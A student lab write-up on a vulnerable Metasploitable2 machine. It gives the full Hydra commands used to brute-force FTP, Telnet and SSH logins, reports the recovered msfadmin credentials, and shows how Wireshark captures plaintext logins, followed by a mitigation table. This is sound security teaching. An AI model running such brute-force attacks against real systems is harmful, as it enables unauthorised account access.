

# 💻 Labwork 1: Brute Force and Sniffing

---

## 🧰 Tools Used
- **Hydra** – for performing brute force attacks  
- **Wireshark** – for capturing and analyzing network traffic  
- **Kali Linux** – used as the attacker machine  
- **Metasploitable2** – vulnerable virtual machine  
- **FTP, Telnet, SSH** – services used for login and analysis  

---

## 📍 Target IP Enumeration

1. Run the following command on **Kali Linux** to find the Metasploitable2 IP:
   ```bash
   netdiscover
or
   ```bash
   nmap -sn 192.168.154.0/24
   ```
or

Use this command on Metasploitable2:
   ```bash
   ifconfig
   ```
# 1. Enumeration of Usernames🥐

Initial usernames used for brute force attacks were manually prepared in a file usernames.txt:
1.1 Prepare a text file with potential usernames:

    vim username.txt

- msfadmin
- user
- admin
- root
- test
- guest

1.2 Prepare a text file with potential passwords:

      vim password.txt

- msfadmin
- user
- admin
- root
- test
- guest


# 2. Brute Force Attacks🥖

**2.1 FTP**
    - Tool: Hydra
    - Command Used:
        
          hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133

Result: Successful login found – msfadmin:msfadmin

---

**2.2 Telnet**
    - Tool: Hydra
    - Command Used:
       
        hydra -l msfadmin -P passwords.txt telnet://192.168.154.133

Result: Successful login – msfadmin:msfadmin

---

**2.3 SSH**
    - Tool: Hydra
    - Command Used:
        
        hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133

Problem: Hydra (or the SSH client it's using) doesn't support the older key exchange algorithms used by the Meta2 machine, which is very outdated



# 3. Sniffing Network Traffic🍖

**3.1 Start Wireshark on Kali**

a) Open Wireshark

b) Select the active network interface (e.g., eth0 or ens33).

c) Start capturing

---

**3.2 FTP Login Traffic Analysis**

a) Connect using:

    ftp 192.168.154.133

b) Login with: msfadmin:msfadmin

c) In Wireshark, use filter:

    ftp 

---
**3.3 Telnet Login Traffic Analysis**

a) Connect using 

    telnet 192.168.154.133

b) Login with: msfadmin:msfadmin

c) In Wireshark, use filter:

    telnet



# 4.Problems Encountered🍕

| Protocol | Problem | Solution |
|----------|---------|----------|
|FTP	   |None	 |N/A
|Telnet|	Service was off initially	|Enabled Telnet on Metasploitable2
|SSH	|Hydra connection failed due to key mismatch	|

# 5.Mitigation Strategies🍥

| Protocol | Vulnerability | Secure Alternative	| Why it’s better|
|-----------|-------------|---------------------|---------------|
|FTP	|Sends credentials in plaintext	|SFT2P / FTPS|	Encrypts file transfer data and credentials
|Telnet|	Transmits all in plaintext|	SSH	|SSH encrypts communication
|SSH	|Still brute-forceable	|Use key-based login, strong passwords	|Prevents brute force access



